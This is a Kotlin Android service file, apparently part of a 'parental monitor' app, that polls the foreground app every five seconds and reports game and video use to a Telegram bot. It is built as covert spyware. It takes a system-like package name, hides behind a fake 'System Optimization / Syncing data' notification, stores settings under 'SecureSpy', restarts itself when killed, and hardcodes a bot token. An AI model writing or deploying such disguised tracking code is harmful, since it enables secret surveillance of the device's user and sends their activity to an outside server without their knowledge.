
package com.android.sysutils

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import android.app.usage.UsageStatsManager
import android.content.Context
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.SortedMap
import java.util.TreeMap
import android.app.usage.UsageEvents
import android.content.SharedPreferences
import android.util.Log

class MonitorService : Service() {

    private val job = Job()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    
    // CONFIG
    private val TOKEN = "8273896748:AAEHpObUiJ45EVMKXMI4vYf7ZNKQNmY8Hmg"
    private var parentId: String = ""
    
    private var lastApp = ""
    private var currentCat = ""
    private var startTime = 0L
    private var lastAlertTime = 0L

    override fun onCreate() {
        super.onCreate()
        startForegroundService()
        
        // Load settings
        val prefs = getSharedPreferences("SecureSpy", Context.MODE_PRIVATE)
        parentId = prefs.getString("PARENT_ID", "") ?: ""
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (parentId.isNotEmpty()) {
            scope.launch {
                sendTelegram("🟢 **Android Monitor Active**")
                monitorLoop()
            }
        } else {
            // Wait for MainActivity to set ID?
            // Usually MainActivity starts this service, so prefs should be set.
            // If boot up, ID should be there. If not, service stops.
            stopSelf()
        }
        return START_STICKY // Restart if killed
    }

    private fun startForegroundService() {
        val channelId = "SystemSyncChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Optimization")
            .setContentText("Syncing data...")
            .setSmallIcon(android.R.drawable.ic_dialog_info) // Should replace with "update" icon
            .build()
            
        startForeground(1, notification)
    }

    private suspend fun monitorLoop() {
        val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        
        while (isActive) {
            delay(5000) // Check every 5s
            
            val currentTime = System.currentTimeMillis()
            val stats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, currentTime - 10000, currentTime)
            
            // Get FOREGROUND app (most recent)
            if (stats != null && stats.isNotEmpty()) {
                val sortedMap = TreeMap<Long, android.app.usage.UsageStats>()
                for (usageStats in stats) {
                    sortedMap[usageStats.lastTimeUsed] = usageStats
                }
                if (sortedMap.isNotEmpty()) {
                    val currentAppStats = sortedMap[sortedMap.lastKey()]
                    val pkgName = currentAppStats?.packageName ?: ""
                    
                    if (pkgName.isNotEmpty() && pkgName != lastApp) {
                        handleAppChange(pkgName)
                    } else if (pkgName == lastApp) {
                        handleOngoing(pkgName)
                    }
                }
            }
        }
    }

    private fun handleAppChange(pkgName: String) {
        val category = categorize(pkgName)
        val now = System.currentTimeMillis()
        
        // End session log
        if (startTime > 0 && currentCat.isNotEmpty()) {
            val dur = (now - startTime) / 1000
            if (dur > 60) {
                 // Log finished session
                 val mins = dur / 60
                 scope.launch {
                     if (currentCat == "Game" || currentCat == "Video") {
                        sendTelegram("🛑 **Finished** $currentCat ($lastApp)\nDuration: $mins min")
                     }
                 }
            }
        }
        
        // Start new session
        lastApp = pkgName
        currentCat = category
        startTime = now
        lastAlertTime = now
        
        // Notify start
        if (category == "Game" || category == "Video") {
            scope.launch { sendTelegram("▶️ **Started** $category: $pkgName") }
        }
        
        Log.d("SPY", "Changed to $pkgName ($category)")
    }

    private fun handleOngoing(pkgName: String) {
        if (currentCat == "Game" || currentCat == "Video") {
            val dur = (System.currentTimeMillis() - startTime) / 1000
            
            // Alert every 30 mins
            if (dur > 30 * 60) {
                if (System.currentTimeMillis() - lastAlertTime > 30 * 60 * 1000) {
                    val mins = dur / 60
                    scope.launch {
                        sendTelegram("⚠️ **Alert**: Still using $pkgName for **$mins mins**!")
                    }
                    lastAlertTime = System.currentTimeMillis()
                }
            }
        }
    }

    private fun categorize(pkg: String): String {
        return when {
            pkg.contains("youtube") -> "Video"
            pkg.contains("twitch") -> "Video"
            pkg.contains("netflix") -> "Video"
            pkg.contains("tiktok") -> "Social (Video)"
            pkg.contains("instagram") -> "Social"
            pkg.contains("roblox") -> "Game"
            pkg.contains("minecraft") -> "Game"
            pkg.contains("brawlstars") -> "Game"
            pkg.contains("pubg") -> "Game"
            pkg.contains("discord") -> "Social"
            pkg.contains("telegram") -> "Social"
            pkg.contains("whatsapp") -> "Social"
            else -> "Other"
        }
    }

    private fun sendTelegram(msg: String) {
        try {
            val url = URL("https://api.telegram.org/bot$TOKEN/sendMessage")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            
            val json = "{\"chat_id\": \"$parentId\", \"text\": \"$msg\", \"parse_mode\": \"Markdown\"}"
            conn.outputStream.use { it.write(json.toByteArray()) }
            
            if (conn.responseCode != 200) {
                Log.e("SPY", "Telegram Error: ${conn.responseCode}")
            }
            conn.disconnect()
        } catch (e: Exception) {
            Log.e("SPY", "Network Error: $e")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        // If destroyed, try restart?
        val broadcastIntent = Intent(this, BootReceiver::class.java)
        sendBroadcast(broadcastIntent)
    }

    override fun onBind(intent: Intent): IBinder? = null
}
